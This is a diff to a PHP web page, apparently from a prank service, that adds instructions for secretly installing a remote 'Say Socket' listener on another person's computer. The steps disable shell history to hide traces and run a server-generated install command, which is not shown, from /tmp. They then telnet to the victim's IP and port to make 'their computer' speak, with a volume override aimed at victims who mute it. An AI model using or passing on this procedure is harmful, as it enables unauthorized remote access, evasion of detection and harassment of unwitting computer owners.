@@ -63,19 +63,44 @@ require_once '../inc/config.inc';
                                 <li>Select &amp; copy the command given</li>
                                 <li>Open the Terminal (open a new tab if Terminal is already running)</li>
                                 <li>
-                                    Disable bash history
+                                    Disable bash history:
                                     <pre> $ unset HISTFILE</pre>
                                 </li>
                                 <li>
-                                    Use the tmp directory
+                                    Use the tmp directory:
                                     <pre> $ cd /tmp</pre>
                                 </li>
                                 <li>
-                                    Paste your command and run! (Hit "ENTER")
+                                    Paste your command and run! (Hit "ENTER"):
                                     <pre id="instructions-cmd"> $ <?php echo parse_file_contents('cmd', 'XXXXXXXXXXXXXXXX', true); ?></pre>
                                 </li>
-                                <li>Close the terminal window opened by you</li>
-                                <li>The email you used to generate the installer will be notified once the SS portal has successfully opened</li>
+                                <li>
+                                    Close the terminal window opened by you
+                                    <p class="extra">The email you used to generate the installer will be notified once the SS portal has successfully opened</p>
+                                </li>
+                                <li>
+                                    With IP and Port specified in the notification email, connect using telnet
+                                    <pre> $ telnet [IP ADDRESS] [PORT]</pre>
+                                    This will look something like this:
+                                    <pre> $ telnet 192.168.1.100 12345</pre>
+                                </li>
+                                <li>
+                                    If your connection is successful, you should see this welcome message along with the say prompt:
+<pre>Welcome to the Say Socket!
+Type anything to say it through the socket.
+To quit, type 'quit'. To shut down the server type 'shutdown'.
+say> </pre>
+                                </li>
+                                <li>
+                                    Now anything you type will be spoken by their computer!
+                                    <p class="extra">Except special characters and existing shell commands</p>
+                                </li>
+                                <li>
+                                    <h3>Are they confused and muting their sound?<br />Good thing it comes with a volume override!</h3>
+                                    Instead of entering something silly for their computer to say, use the custom "volume" command
+                                    <p class="extra">The "volume" command will accept integer [0-9] as the volume level</p>
+                                    <pre> say> volume 9</pre>
+                                </li>
                             </ol>
                         </div>
                     </div>
